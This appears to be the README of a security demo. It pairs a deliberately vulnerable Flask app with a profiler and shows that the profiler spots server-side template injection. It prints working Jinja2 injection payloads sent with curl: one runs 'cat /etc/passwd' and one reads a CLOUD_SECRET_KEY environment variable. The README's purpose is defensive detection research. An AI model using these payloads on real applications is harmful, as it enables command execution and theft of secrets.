# demo-profile-ssti

Flask application containing SSTI vulnerability.

The profiler measured normal requests, attack requests that read `/etc/passwd`, and attack requests that extract `CLOUD_SECRET_KEY` from environment variables.

Then, from the comparison of the measurement results, it was confirmed that the profiler can find traces of the attack.

## read `/etc/passwd`

### request

```
$ curl -X POST http://192.168.0.205:80/ssti -d name="test"
test
```

### profile data

<https://github.com/hi120ki/demo-profile-ssti/blob/main/data/normal.json>

## read `/etc/passwd`

### request

```
$ curl -X POST http://192.168.0.205:80/ssti -d name="{{request.application.__globals__.__builtins__.__import__('os').popen('cat /etc/passwd').read()}}"
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
...
```

### profile data

The following differences were confirmed compared to normal requests.

```diff
+ { "func": "popen", "file": "/usr/local/lib/python3.10/os.py" },
+ { "func": "__init__", "file": "/usr/local/lib/python3.10/subprocess.py" },
+ { "func": "_cleanup", "file": "/usr/local/lib/python3.10/subprocess.py" },
+ { "func": "_get_handles", "file": "/usr/local/lib/python3.10/subprocess.py" },
+ { "func": "__init__", "file": "/usr/local/lib/python3.10/codecs.py" },
+ { "func": "__init__", "file": "/usr/local/lib/python3.10/codecs.py" },
```

<https://github.com/hi120ki/demo-profile-ssti/blob/main/data/steal_etc_passwd.json#L11425>

## extract `CLOUD_SECRET_KEY`

### request

```
$ curl -X POST http://192.168.0.205:80/ssti -d name="{{request.application.__globals__.__builtins__.__import__('os').getenv('CLOUD_SECRET_KEY')}}"
8Z0MH8EWYMB0N439
```

### profile data

The following differences were confirmed compared to normal requests.

```diff
+ { "func": "getenv", "file": "/usr/local/lib/python3.10/os.py" },
+ { "func": "get", "file": "/usr/local/lib/python3.10/_collections_abc.py" },
+ { "func": "__getitem__", "file": "/usr/local/lib/python3.10/os.py" },
+ { "func": "encode", "file": "/usr/local/lib/python3.10/os.py" },
+ { "func": "decode", "file": "/usr/local/lib/python3.10/os.py" },
```

<https://github.com/hi120ki/demo-profile-ssti/blob/main/data/steal_cloud_secret_key.json#L9629>
